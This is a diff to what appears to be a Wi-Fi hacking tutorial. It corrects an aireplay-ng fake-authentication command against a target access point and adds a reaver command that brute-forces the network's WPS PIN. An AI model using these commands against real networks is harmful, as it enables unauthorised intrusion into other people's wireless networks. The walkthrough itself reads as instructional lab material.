@@ -60,8 +60,11 @@ wash --interface wlan0
 ```
 - Use aireplay-ng to create a fake authentication with te first MAC address is the target and the second is the USB wireless adapter MAC address, which is the first 12 characters from the ifconfig, make sure to replace the "-" with the ":".
 ```bash
-aireplay-ng --fakeauth 30 78:67:0E:31:4C:42 -h 3A:97:5F:E2:18:5F wlan0
+aireplay-ng --fakeauth 30 -a 78:67:0E:31:4C:42 -h 3A:97:5F:E2:18:5F wlan0
 ```
-
+- Don't execute the code above yet. We go to the second terminal and use reaver tool to bruteforce and get the pin.
+```bash
+reaver --bssid 78:67:0E:31:4C:42 --channel 1 --interface wlan0 -vvv --no-associate
+```
 
 ￼
